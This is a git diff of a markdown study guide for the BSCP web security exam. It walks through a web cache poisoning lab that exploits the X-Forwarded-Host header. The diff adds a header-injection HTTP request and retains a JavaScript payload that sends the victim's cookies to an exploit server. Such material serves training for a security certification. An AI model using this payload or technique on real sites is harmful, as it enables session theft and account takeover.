@@ -23,18 +23,29 @@ The acronym BSCP has nice simular ring like OSCP  :)
 
 ## Web Cache Poison  
 
->Target use **tracking.js** JavaScript, and is vulnerable to X-Forwarded-Host header redirecting path, allowing the stealing of cookie by poisoning cache.
+>Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.
+
+```html
+GET / HTTP/1.1
+Host: TARGET.web-security-academy.net
+X-Forwarded-Host: exploit-SERVER.exploit-server.net
+
+```  
 
 ![tracking.js](tracking.js.png)  
 
->Hosting the following **on exploit server, injecting the **X-Forwarded-Host** header, and poison the cache until victim hits poison cache.  
+>Hosting the following **on exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  
 
 ![exploit host tracking.js](exploit-host-tracking-js.png)  
 
-```javascript
-document.location='https://exploit.exploit-server.net//cookies?c='+document.cookie;
+```
+ /resources/js/tracking.js 
 ```  
->Keep poising the cache of target by resending request with **X-Forwarded-Host** header.  
+  
+```javascript
+document.location='https://exploit.exploit-server.net/cookies?c='+document.cookie;
+```  
+>Keep **Poisoning** the web cache of target by resending request with **X-Forwarded-Host** header.  
 
 ![x-cache-hit.png](x-cache-hit.png)  
 
